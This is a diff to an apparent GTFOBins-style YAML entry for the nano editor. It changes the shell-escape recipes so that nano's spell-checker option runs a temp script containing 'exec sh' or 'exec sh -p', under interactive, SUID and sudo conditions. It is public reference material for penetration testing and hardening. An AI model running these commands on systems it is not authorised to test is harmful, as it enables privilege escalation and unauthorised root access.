@@ -1,11 +1,9 @@
 ---
 functions:
-  execute-non-interactive:
-    - description: After running this exit the editor to see the command output.
-      code: |
-        COMMAND=id
+  execute-interactive:
+    - code: |
         TF=$(mktemp)
-        echo "$COMMAND" > $TF
+        echo 'exec sh' > $TF
         chmod +x $TF
         nano -s $TF /etc/hosts
         ^T
@@ -17,20 +15,16 @@ functions:
   file-read:
     - code: nano file_to_read
   suid-enabled:
-    - description: After running this exit the editor to see the command output.
-      code: |
-        COMMAND=id
+    - code: |
         TF=$(mktemp)
-        echo $'#!/bin/sh -p\n'"$COMMAND" > $TF
+        echo 'exec sh -p' > $TF
         chmod +x $TF
         ./nano -s $TF /etc/hosts
         ^T
   sudo-enabled:
-    - description: After running this exit the editor to see the command output.
-      code: |
-        COMMAND=id
+    - code: |
         TF=$(mktemp)
-        echo "$COMMAND" > $TF
+        echo 'exec sh' > $TF
         chmod +x $TF
         sudo nano -s $TF /etc/hosts
         ^T
